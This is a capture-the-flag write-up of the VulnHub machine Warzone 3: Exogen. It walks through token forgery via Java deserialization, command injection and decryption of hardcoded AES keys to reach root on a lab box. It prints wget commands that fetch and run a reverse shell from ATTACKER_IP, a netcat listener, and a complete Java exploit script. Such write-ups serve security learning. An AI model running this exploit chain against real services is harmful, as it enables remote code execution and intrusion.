# Warzone 3: Exogen — VulnHub Writeup

**Difficulty:** Hard  
**Platform:** VulnHub  
**Focus:** Java, Custom Exploitation, Code Analysis, Crypto, Programming  
**Author:** Alienum  

---

## Overview

Warzone 3 is a hard-rated VulnHub machine centered entirely around Java —
reverse engineering a custom client application, exploiting insecure
deserialization, chaining crypto decryptions, and ultimately rooting the box
without a walkthrough.

---

## Reconnaissance

Starting with an nmap scan revealed FTP and a custom Java service on port 4444.
Anonymous FTP access exposed two files in `/pub`:

- `alienclient.jar` — a Java GUI client
- `note.txt` — containing default credentials `alienum:exogenesis`

---

## Reverse Engineering the Client

Using CFR decompiler (note: requires absolute paths or it throws a NullPointerException):

```bash
java -jar cfr.jar $(pwd)/alienclient.jar --outputdir ./decompiled
```

This revealed three classes: `Starter`, `RE`, and `Token`. The client
communicates with the server on port 4444 using Java serialization, sending
`RE` objects containing a `Token`, `option`, `cmd`, and `value`.

Key discovery: the server checks the `role` field inside the `Token` object
to authorize commands — and trusts it completely without server-side verification.

---

## Insecure Deserialization — Token Forgery

Logging in as `researcher` returned a valid session token but `VIEW` commands
were denied. Reading the decompiled source revealed `astronaut` was the
privileged role.

Since the `Token` object is serialized client-side and trusted blindly by the
server, forging it was trivial:

```java
Token token = new Token(tokenValue, "astronaut"); // forged role
```

This granted full access to the `VIEW` command.

---

## Arbitrary File Read via Path Traversal

The server passed the `cmd` field directly to a shell executing `tail`.
Substituting a filename with an absolute path gave arbitrary file read:

```java
sendRequest(token, "VIEW", "tail /etc/passwd", "VALUE");
```

This revealed two interesting users: `anunnaki` and `exomorph`.

---

## Remote Code Execution

The key breakthrough came from replacing the tail argument with `whoami` on
a hunch — and getting `exomorph` back in the response. This confirmed full
command execution without needing to fight the protocol for output.

Rather than trying to retrieve command output through the Java protocol,
the approach was flipped — make the server reach out instead. A reverse shell
was written in Java, hosted on a local HTTP server, and pulled down to the target:

```java
// Download reverse shell
sendRequest(token, "VIEW", "wget http://ATTACKER_IP:8000/reverse.java -O /home/exomorph/reverse.java", "VALUE");

// Execute it
sendRequest(token, "VIEW", "java /home/exomorph/reverse.java", "VALUE");
```

With a netcat listener running, a shell landed as `exomorph`.

```bash
nc -lvnp 9001
```

---

## Stabilising the Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Lateral Movement — exomorph to anunnaki

In `/home/anunnaki/` an encrypted file `aliens.encrypted` was found along
with `wrz3encryptor.jar`. Decompiling the encryptor revealed AES-128 ECB
encryption with a hardcoded key:

```java
String key = "w4rz0nerex0gener"; // 16 bytes = AES-128
```

Decrypting locally revealed serialized Java strings — identifiable by the
`ac ed 00 05 74 00` magic bytes at the start of each entry. The `..` suffix
on each password is a Java serialization artifact that was initially missed,
making the passwords appear wrong until the hex dump revealed the truth.

Correct password for `anunnaki`: `nak1nak1..`

---

## Privilege Escalation — anunnaki to root

In `/home/anunnaki/` a GPG-encrypted jar `secpasskeeper.jar.gpg` was found,
along with a hint in `info.txt` to use `--batch` when decrypting.

```bash
echo "nak1nak1.." | gpg --batch --passphrase-fd 0 --output secpasskeeper.jar --decrypt secpasskeeper.jar.gpg
```

Decompiling `secpasskeeper.jar` revealed a password manager with hardcoded
AES keys. The `removeSalt()` function simply strips the prefix `al13n` from
the stored strings. Tracing the decryption chain manually:

```
key1  = "pr0tect1on1smust"                        (gotSecret())
enc1  = "/aom7EHcuiCWzNArA72UVn0nnVtJ5jZSPHDmjFPc5KQ="  (getSecret() unsalted)
enc2  = "jJ2Mrz4wjZDMSPwDr6TolQ=="                (getCipher() unsalted)

step1 = decrypt(key1,  enc1) → "etheronerocosmos"
step2 = decrypt(step1, enc2) → "ufo_phosXEN"
```

Root password: `ufo_phosXEN`

```bash
su root
# password: ufo_phosXEN
cat /root/boss.txt
# EXOGEN { WARZONE_FINAL_BOSS }
```

---

## Full Exploit Code

```java
import java.io.*;
import java.net.Socket;
import alien.RE;
import alien.Token;

public class Exploit {

    static String host = "warzone.local";
    static int port = 4444;

    public static RE sendRequest(Token token, String option, String cmd, String value) throws Exception {
        Socket s = new Socket(host, port);
        s.setSoTimeout(5000);
        ObjectOutputStream os = new ObjectOutputStream(s.getOutputStream());
        ObjectInputStream is = new ObjectInputStream(s.getInputStream());

        RE req = new RE();
        req.setToken(token);
        req.setOption(option);
        req.setCmd(cmd);
        req.setValue(value);

        os.writeObject(req);
        os.flush();

        RE resp = (RE) is.readObject();
        os.close(); is.close(); s.close();
        return resp;
    }

    public static void main(String[] args) throws Exception {
        // Step 1: Login
        RE loginResp = sendRequest(null, "LOGIN", null, "alienum@exogenesis");
        System.out.println("Login: " + loginResp);

        // Step 2: Forge astronaut token
        String tokenValue = loginResp.getToken().getValue();
        Token token = new Token(tokenValue, "astronaut");

        // Step 3: Download and execute reverse shell
        String attackerIP = "ATTACKER_IP";
        sendRequest(token, "VIEW", "wget http://" + attackerIP + ":8000/reverse.java -O /home/exomorph/reverse.java", "VALUE");
        sendRequest(token, "VIEW", "java /home/exomorph/reverse.java", "VALUE");
    }
}
```

---

## Summary

| Step | Technique |
|------|-----------|
| Recon | FTP enumeration, nmap |
| Initial access | Insecure deserialization, token forgery |
| File read | Path traversal via tail command |
| RCE | Direct command execution, wget reverse shell |
| Lateral movement | AES-128 ECB decryption, Java serialization analysis |
| Privilege escalation | GPG decryption, chained AES decryption |

---

*Completed without a walkthrough. Machine by Alienum with ❤️*
